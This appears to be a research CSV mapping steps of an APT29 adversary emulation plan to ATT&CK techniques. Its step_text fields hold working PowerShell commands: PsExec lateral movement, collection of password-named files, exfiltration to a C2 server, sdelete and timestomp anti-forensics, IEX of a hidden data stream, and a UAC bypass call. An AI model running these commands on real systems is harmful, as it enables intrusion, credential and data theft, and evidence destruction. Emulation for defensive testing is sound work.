org_name,plan_id,scenario_id,step_id,step_order,step_title,step_text,attack_technique_ids_raw,attack_technique_ids_parent,source_file,mapping_method,mapping_quality
apt29,apt29,unknown,apt29::99,99,Copy Sandcat File,"id: bddc0abc-07a0-41b7-813f-e0c64d9226b3 | name: Copy Sandcat File | description: Copy Sandcat file using PsExec | tactic: lateral-movement | technique: attack_id: T1105 | name: Ingress Tool Transfer | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_lat_movement | procedure_step: 8.B | platforms: windows: psh,pwsh: command: move-item sandcat.go-windows-upx C:\Windows\temp\python.exe -force;
set-location ""C:\Program Files\SysinternalsSuite\"";
.\PsExec64.exe -accepteula \\#{pivot_machine_hostname} -i #{user.session.id} -d -f -c ""C:\Windows\Temp\python.exe"" -group ""day-1-lateral-movement"" -server ""#{server}"";
tasklist /S #{pivot_machine_hostname} /FI ""IMAGENAME eq python.exe"";
 | payloads: sandcat.go-windows-upx | input_arguments: pivot_machine_hostname: description: Hostname of pivot machine | type: string | default: pivothost | user.session.id: description: Session id for user | type: string | default: 1 | server: description: IP or Hostname of server | type: string | default: 192.0.2.10 | executors: name: powershell | command: ","[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::100,100,Ingress Tool Transfer,attack_id: T1105 | name: Ingress Tool Transfer,"[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::101,101,Screen Capture (T1113),"id: 0b1841bd-ef8b-475c-bce7-8fcb2860984a | name: Screen Capture (T1113) | description: Native API call(s) were used to collect a screenshot. | tactic: collection | technique: attack_id: T1113 | name: Screen Capture | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_collection | procedure_step: 8.D.1 | platforms: windows: psh,pwsh: command: Import-Module .\Get-Screenshot.ps1 -Verbose -Force;
Get-Screenshot;
 | payloads: Get-Screenshot.ps1 | executors: name: powershell | command: Import-Module .\Get-Screenshot.ps1 -Verbose -Force;
Get-Screenshot;
","[""T1113""]","[""T1113""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::102,102,Screen Capture,attack_id: T1113 | name: Screen Capture,"[""T1113""]","[""T1113""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::103,103,File and Directory Discovery (T1083),"id: d5170a60-3bdc-44e0-9870-a38db5c0cf81 | name: File and Directory Discovery (T1083) | description: PowerShell's Get-ChildItem alias 'ls' is used to enumerate files in a remote file share. | tactic: discovery | technique: attack_id: T1083 | name: File and Directory Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 9.A.1 | platforms: windows: psh,pwsh: command: ls #{remote.file.share}
 | input_arguments: remote.file.share: description: IP or Hostname of remote file share | type: string | default: 192.0.2.20 | executors: name: powershell | command: ls #{remote.file.share}
","[""T1083""]","[""T1083""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::104,104,File and Directory Discovery,attack_id: T1083 | name: File and Directory Discovery,"[""T1083""]","[""T1083""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::105,105,Automated document collection (T1119),"id: 08e57385-dbce-4850-8bb7-589ef79465ab | name: Automated document collection (T1119) | description: Execute PowerShell collection command to collect and compress files of specific extensions. | tactic: execution | technique: attack_id: T1059.001 | name: Command and Scripting Interpreter: PowerShell | cti_source: https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html | procedure_group: procedure_execution | procedure_step: 9.B.1 | platforms: windows: psh,pwsh: command: move-item Rar.exe -Destination C:\Windows\Temp -Force;
$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\working.zip -Force;
cd C:\Windows\Temp;
.\Rar.exe a -hpfGzq5yKw ""$env:USERPROFILE\Desktop\working.zip"" ""$env:APPDATA\working.zip"";
 | payloads: rar.exe | executors: name: powershell | command: move-item Rar.exe -Destination C:\Windows\Temp -Force;
$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\working.zip -Force;
cd C:\Windows\Temp;
.\Rar.exe a -hpfGzq5yKw ""$env:USERPROFILE\Desktop\working.zip"" ""$env:APPDATA\working.zip"";
","[""T1059.001"", ""T1119""]","[""T1059"", ""T1119""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::106,106,Command and Scripting Interpreter: PowerShell,attack_id: T1059.001 | name: Command and Scripting Interpreter: PowerShell,"[""T1059.001""]","[""T1059""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::107,107,Data from staged file (T1074) and Exfiltration over C2 Channel (T1041),"id: 2d18c8ec-4593-49dc-9bf4-11d0673d6ae6 | name: Data from staged file (T1074) and Exfiltration over C2 Channel (T1041) | description: Copy a target file from a remote file share through the existing C2 channel | tactic: exfiltration | technique: attack_id: T1041 | name: Exfiltration Over C2 Channel | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_exfiltration | procedure_step: 9.B.8 | platforms: windows: psh,pwsh: command: Import-Module .\upload.ps1 -Verbose -Force;
Invoke-MultipartFormDataUpload -InFile ""C:\Users\#{profile_user}\Desktop\working.zip"" -Uri ""#{server}/file/upload"";
 | cleanup: remove-item upload.ps1 -Force
 | payloads: upload.ps1 | input_arguments: profile_user: description: Name of profile user | type: string | default: Administrator | server: description: IP or Hostname of server | type: string | default: 192.0.2.10 | executors: name: powershell | command: Import-Module .\upload.ps1 -Verbose -Force;
Invoke-MultipartFormDataUpload -InFile ""C:\Users\#{profile_user}\Desktop\working.zip"" -Uri ""#{server}/file/upload"";
 | cleanup_command: remove-item upload.ps1 -Force
","[""T1041"", ""T1074""]","[""T1041"", ""T1074""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::108,108,Exfiltration Over C2 Channel,attack_id: T1041 | name: Exfiltration Over C2 Channel,"[""T1041""]","[""T1041""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::109,109,Artifact Cleanup - Delete Staged Files,"id: 208b021b-c79a-4176-8ad1-3af99ed50c6f | name: Artifact Cleanup - Delete Staged Files | description: Cleanup files related to Operation | tactic: defensive-evasion | technique: attack_id: T1070.004 | name: Indicator Removal on Host: File Deletion | cti_source: https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=6ab66701-25d7-4685-ae9d-93d63708a11c&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments | procedure_group: procedure_def_evasion | procedure_step: 9.C | platforms: windows: psh,pwsh: command: if (!$(test-path -path ""C:\Program Files\SysInternalsSuite"")) {
  mkdir ""C:\Program Files\SysInternalsSuite"";
}
set-location ""C:\Program Files\SysInternalsSuite"";

if (!$(test-path -path ""sdelete64.exe"")) {
  iwr -uri ""https://download.sysinternals.com/files/SDelete.zip"" -outfile sdelete64.zip;
  Expand-Archive sdelete64.zip -force;
}
copy sdelete64.exe C:\Windows\Temp\;
cd C:\Windows\Temp\ ;
.\sdelete64.exe /accepteula C:\Windows\Temp\Rar.exe;
.\sdelete64.exe /accepteula C:\Users\#{profile_user}\AppData\Roaming\working.zip;
.\sdelete64.exe /accepteula C:\Users\#{profile_user}\Desktop\working.zip;
remove-item C:\Windows\Temp\sdelete64.exe -force;
 | input_arguments: profile_user: description: Name of profile user | type: string | default: Administrator | executors: name: powershell | command: if (!$(test-path -path ""C:\Program Files\SysInternalsSuite"")) {
  mkdir ""C:\Program Files\SysInternalsSuite"";
}
set-location ""C:\Program Files\SysInternalsSuite"";

if (!$(test-path -path ""sdelete64.exe"")) {
  iwr -uri ""https://download.sysinternals.com/files/SDelete.zip"" -outfile sdelete64.zip;
  Expand-Archive sdelete64.zip -force;
}
copy sdelete64.exe C:\Windows\Temp\;
cd C:\Windows\Temp\ ;
.\sdelete64.exe /accepteula C:\Windows\Temp\Rar.exe;
.\sdelete64.exe /accepteula C:\Users\#{profile_user}\AppData\Roaming\working.zip;
.\sdelete64.exe /accepteula C:\Users\#{profile_user}\Desktop\working.zip;
remove-item C:\Windows\Temp\sdelete64.exe -force;
","[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::110,110,Indicator Removal on Host: File Deletion,attack_id: T1070.004 | name: Indicator Removal on Host: File Deletion,"[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::111,111,Scheduled Task,"id: 4b2e9574-b1a7-4b38-95b2-6054ded9c4fe | name: Scheduled Task | description: Reboot the machine to aid in peristence callbacks | tactic: impact | technique: attack_id: T1529 | name: System Shutdown/Reboot | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_impact | procedure_step: 10.A.2 | platforms: windows: psh,pwsh: command: write-host ""[*] Restarting Computer"";
Restart-Computer -Force;
 | executors: name: powershell | command: write-host ""[*] Restarting Computer"";
Restart-Computer -Force;
","[""T1529""]","[""T1529""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::112,112,System Shutdown/Reboot,attack_id: T1529 | name: System Shutdown/Reboot,"[""T1529""]","[""T1529""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::113,113,Artifact Cleanup,"id: 4bedbd9b-a570-4f9f-b78a-2f7f99ad5e92 | name: Artifact Cleanup | description: Delete file artifacts left from the operation. | tactic: defensive-evasion | technique: attack_id: T1070.004 | name: Indicator Removal on Host: File Deletion | cti_source: https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=6ab66701-25d7-4685-ae9d-93d63708a11c&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments | procedure_group: procedure_def_evasion | procedure_step: 10.A.3 | platforms: windows: psh,pwsh: command: Remove-Item -Path ""$env:USERPROFILE\Downloads\*.pfx"" -Force;
Remove-Item -Path ""$env:USERPROFILE\Downloads\*.bmp"" -Force;
Remove-Item -Path ""$env:USERPROFILE\Downloads\*.png"" -Force;
if (test-path -path ""$env:APPDATA\OfficeSupplies.7z"") {
    Remove-Item -Path ""$env:APPDATA\OfficeSupplies.7z"" -Force; write-host ""[+] Successfully removed OfficeSupplies.7z"";
} else {
    write-host ""[!] File did not exist to be removed!"";
}

if (get-job -name ""Keystrokes"" -ErrorAction SilentlyContinue) {
    Remove-Job -Name ""Keystrokes"";
    if ($?) {
        write-host ""[+] Job \""Keystrokes\"" was remove."";
    }
} else {
    write-host ""[!] Job \""Keystrokes\"" did not exist."";
}

if (get-job -Name ""Screenshot"" -ErrorAction SilentlyContinue) {
    Remove-Job -Name ""Screenshot"" -Force;
    write-host ""[+] Job \""screenshot\"" was removed."";
} else {
    write-host ""[*] Job \""screenshot\"" does not exist, thus was not removed."";
}
remove-item upload.ps1 -Force;
 | executors: name: powershell | command: Remove-Item -Path ""$env:USERPROFILE\Downloads\*.pfx"" -Force;
Remove-Item -Path ""$env:USERPROFILE\Downloads\*.bmp"" -Force;
Remove-Item -Path ""$env:USERPROFILE\Downloads\*.png"" -Force;
if (test-path -path ""$env:APPDATA\OfficeSupplies.7z"") {
    Remove-Item -Path ""$env:APPDATA\OfficeSupplies.7z"" -Force; write-host ""[+] Successfully removed OfficeSupplies.7z"";
} else {
    write-host ""[!] File did not exist to be removed!"";
}

if (get-job -name ""Keystrokes"" -ErrorAction SilentlyContinue) {
    Remove-Job -Name ""Keystrokes"";
    if ($?) {
        write-host ""[+] Job \""Keystrokes\"" was remove."";
    }
} else {
    write-host ""[!] Job \""Keystrokes\"" did not exist."";
}

if (get-job -Name ""Screenshot"" -ErrorAction SilentlyContinue) {
    Remove-Job -Name ""Screenshot"" -Force;
    write-host ""[+] Job \""screenshot\"" was removed."";
} else {
    write-host ""[*] Job \""screenshot\"" does not exist, thus was not removed."";
}
remove-item upload.ps1 -Force;
","[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::114,114,Indicator Removal on Host: File Deletion,attack_id: T1070.004 | name: Indicator Removal on Host: File Deletion,"[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::115,115,Startup Folder Persistence Execution,"id: 00446217-53ca-4749-bacd-f41fe189d36e | name: Startup Folder Persistence Execution | description: Sets credentials for a headless RDP session to spawn triggering startup folder persistence. | tactic: lateral-movement | technique: attack_id: T1037.005 | name: Boot or Logon Initialization Scripts: Startup Items | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_lat_movement | procedure_step: 10.B | platforms: windows: psh,pwsh: command: cmdkey /add:127.0.0.2 /user:#{profile_user} /pass:#{profile_user_password};
mstsc /v:127.0.0.2;
sleep 10;
Get-Process -name mstsc;
if ($?) { taskkill.exe /F /IM mstsc.exe; exit 0; } else {exit 1;}
 | input_arguments: profile_user: description: Name of profile user | type: string | default: Administrator | profile_user_password: description: Password of profile user | type: string | default: Password123! | executors: name: powershell | command: cmdkey /add:127.0.0.2 /user:#{profile_user} /pass:#{profile_user_password};
mstsc /v:127.0.0.2;
sleep 10;
Get-Process -name mstsc;
if ($?) { taskkill.exe /F /IM mstsc.exe; exit 0; } else {exit 1;}
","[""T1037.005""]","[""T1037""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::116,116,Boot or Logon Initialization Scripts: Startup Items,attack_id: T1037.005 | name: Boot or Logon Initialization Scripts: Startup Items,"[""T1037.005""]","[""T1037""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::117,117,Click .LNK payload,"id: e506f811-884d-4992-aacb-514b33a0324f | name: Click .LNK payload | description: Execute PowerShell collection command to collect and compress files of specific extensions. | tactic: execution | technique: attack_id: T1204.002 | name: User Execution: Malicious File | cti_source: https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html | procedure_group: procedure_execution | procedure_step: 11.A | platforms: windows: psh,pwsh: command: Set-Location -Path ""C:\Users\#{profile_user_day2}\Desktop"";

if(Test-Path -LiteralPath ""$env:appdata\Microsoft\kxwn.lock""){
  Remove-Item ""$env:appdata\Microsoft\kxwn.lock"" -Force;
  Write-Host ""Removed old kxwn.lock file"";
}

powershell.exe Get-Content '.\2016_United_States_presidential_election_-_Wikipedia.html' -Stream schemas | IEX;
 | cleanup: Remove-Item ""$env:appdata\Microsoft\kxwn.lock"" -Force;
 | input_arguments: profile_user_day2: description: Name of profile user | type: string | default: Administrator | executors: name: powershell | command: Set-Location -Path ""C:\Users\#{profile_user_day2}\Desktop"";

if(Test-Path -LiteralPath ""$env:appdata\Microsoft\kxwn.lock""){
  Remove-Item ""$env:appdata\Microsoft\kxwn.lock"" -Force;
  Write-Host ""Removed old kxwn.lock file"";
}

powershell.exe Get-Content '.\2016_United_States_presidential_election_-_Wikipedia.html' -Stream schemas | IEX;
 | cleanup_command: Remove-Item ""$env:appdata\Microsoft\kxwn.lock"" -Force;
","[""T1204.002""]","[""T1204""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::118,118,User Execution: Malicious File,attack_id: T1204.002 | name: User Execution: Malicious File,"[""T1204.002""]","[""T1204""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::119,119,Timestomp kxwn.lock,"id: 4a2ad84e-a93a-4b2e-b1f0-c354d6a41278 | name: Timestomp kxwn.lock | description: Timestomp kxwn.lock | tactic: defensive-evasion | technique: attack_id: T1070.006 | name: Indicator Removal on Host: Timestomp | cti_source: https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html | procedure_group: procedure_def_evasion | procedure_step: 12.A | platforms: windows: psh,pwsh: command: if (!(test-path -path ""$env:appdata\Microsoft\kxwn.lock"")) {
  write-host ""[!] kxwn.lock was not found on this host."";
  exit 1;
} else {
  . .\timestomp.ps1;
  timestomp -dest ""$env:appdata\Microsoft\kxwn.lock"";
}
 | payloads: timestomp.ps1 | executors: name: powershell | command: if (!(test-path -path ""$env:appdata\Microsoft\kxwn.lock"")) {
  write-host ""[!] kxwn.lock was not found on this host."";
  exit 1;
} else {
  . .\timestomp.ps1;
  timestomp -dest ""$env:appdata\Microsoft\kxwn.lock"";
}
","[""T1070.006""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::120,120,Indicator Removal on Host: Timestomp,attack_id: T1070.006 | name: Indicator Removal on Host: Timestomp,"[""T1070.006""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::121,121,Detect Anti-Virus,"id: f9c0b150-822f-497b-ad6d-187f24561e9a | name: Detect Anti-Virus | description: Detect anti-virus software on host | tactic: discovery | technique: attack_id: T1518.001 | name: Software Discovery: Security Software Discovery | cti_source: https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html | procedure_group: procedure_discovery | procedure_step: 12.B | platforms: windows: psh,pwsh: command: . .\stepTwelve.ps1;
detectav
 | payloads: stepTwelve.ps1 | executors: name: powershell | command: . .\stepTwelve.ps1;
detectav
","[""T1518.001""]","[""T1518""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::122,122,Software Discovery: Security Software Discovery,attack_id: T1518.001 | name: Software Discovery: Security Software Discovery,"[""T1518.001""]","[""T1518""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::123,123,Detect Software,"id: 2b5a72b1-01e4-48ae-98b0-2570a7894371 | name: Detect Software | description: Detect software on host | tactic: discovery | technique: attack_id: T1518 | name: Software Discovery | cti_source: https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html | procedure_group: procedure_discovery | procedure_step: 12.C | platforms: windows: psh,pwsh: command: . .\stepTwelve.ps1;
software;
 | payloads: stepTwelve.ps1 | executors: name: powershell | command: . .\stepTwelve.ps1;
software;
","[""T1518""]","[""T1518""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::124,124,Software Discovery,attack_id: T1518 | name: Software Discovery,"[""T1518""]","[""T1518""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::125,125,Enumerate Computer Name,"id: 0cfadbcb-ec21-44ae-adb7-9a23176dd620 | name: Enumerate Computer Name | description: Triage host for ComputerNameNetBIOS,ComputerNameDnsHostname,ComputerNameDnsDomain,ComputerNameDnsFullyQualified,ComputerNamePhysicalNetBIOS,ComputerNamePhysicalDnsHostname,ComputerNamePhysicalDnsDomain,ComputerNamePhysical,DnsFullyQualifie | tactic: discovery | technique: attack_id: T1082 | name: System Information Discovery | cti_source: https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/ | procedure_group: procedure_discovery | procedure_step: 13.A | platforms: windows: psh,pwsh: command: . .\stepThirteen.ps1;
comp;
 | payloads: stepThirteen.ps1 | executors: name: powershell | command: . .\stepThirteen.ps1;
comp;
","[""T1082""]","[""T1082""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::126,126,System Information Discovery,attack_id: T1082 | name: System Information Discovery,"[""T1082""]","[""T1082""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::127,127,Enumerate Domain Name,"id: 96140694-6d13-40b6-9553-0e63533469f3 | name: Enumerate Domain Name | description: Domain triage | tactic: discovery | technique: attack_id: T1082 | name: System Information Discovery | cti_source: https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/ | procedure_group: procedure_discovery | procedure_step: 13.B | platforms: windows: psh,pwsh: command: . .\stepThirteen.ps1;
domain;
 | payloads: stepThirteen.ps1 | executors: name: powershell | command: . .\stepThirteen.ps1;
domain;
","[""T1082""]","[""T1082""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::128,128,System Information Discovery,attack_id: T1082 | name: System Information Discovery,"[""T1082""]","[""T1082""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::129,129,Enumerate Username,"id: f320eebd-e75b-4194-b529-79e64ad0b9ee | name: Enumerate Username | description: user triage | tactic: discovery | technique: attack_id: T1033 | name: System Owner/User Discovery | cti_source: https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/ | procedure_group: procedure_discovery | procedure_step: 13.C | platforms: windows: psh,pwsh: command: . .\stepThirteen.ps1;
user;
 | payloads: stepThirteen.ps1 | executors: name: powershell | command: . .\stepThirteen.ps1;
user;
","[""T1033""]","[""T1033""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::130,130,System Owner/User Discovery,attack_id: T1033 | name: System Owner/User Discovery,"[""T1033""]","[""T1033""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::131,131,Enumerate Processes,"id: a34ab8f2-a106-41fb-af0b-cf5382bd18ae | name: Enumerate Processes | description: Process triage | tactic: discovery | technique: attack_id: T1057 | name: Process Discovery | cti_source: https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/ | procedure_group: procedure_discovery | procedure_step: 13.D | platforms: windows: psh,pwsh: command: . .\stepThirteen.ps1;
pslist;
 | payloads: stepThirteen.ps1 | executors: name: powershell | command: . .\stepThirteen.ps1;
pslist;
","[""T1057""]","[""T1057""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::132,132,Process Discovery,attack_id: T1057 | name: Process Discovery,"[""T1057""]","[""T1057""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::133,133,UAC Bypass via sdctl,"id: 5226e5dc-fc28-43b7-a679-0db49d520402 | name: UAC Bypass via sdctl | description: Invoke UAC bypass sdctl | tactic: defensive-evasion | technique: attack_id: T1134.002 | name: Access Token Manipulation: Create Process with Token | cti_source: https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016 | procedure_group: procedure_def_evasion | procedure_step: 14.A | platforms: windows: psh,pwsh: command: . .\stepFourteen_bypassUAC.ps1;
bypass;
 | payloads: stepFourteen_bypassUAC.ps1 | executors: name: powershell | command: . .\stepFourteen_bypassUAC.ps1;
bypass;
","[""T1134.002""]","[""T1134""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
